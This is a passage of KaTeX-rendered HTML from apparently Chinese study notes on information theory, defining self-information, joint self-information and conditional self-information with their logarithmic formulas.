style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord">∞</span></span></span></span></li><li>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span>的单调递减函数</li></ul></li><li><p>联合自信息量</p><ul><li>涉及多个随机变量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">X_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，其中每一个联合事件均有一个概率</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_1x_2...x_n)=-\log_2p(x_1x_2...x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>当这些变量均独立时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_1x_2...x_n)=I(x_1)+I(x_2)+...+I(x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul></li><li><p>条件自信息量</p><ul><li>类比条件概率</li><li>后验概率：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_i|y_j)=-\log_2p(x_i|y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>信道转移概率：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(y_j|x_i)=-\log_2p(y_j|x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_iy_j)=-\log_2p(y_j|x_i)p(x_i)=I(x_i)+I(y_j|x_i)=I(y_j)+I(x_i|y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span 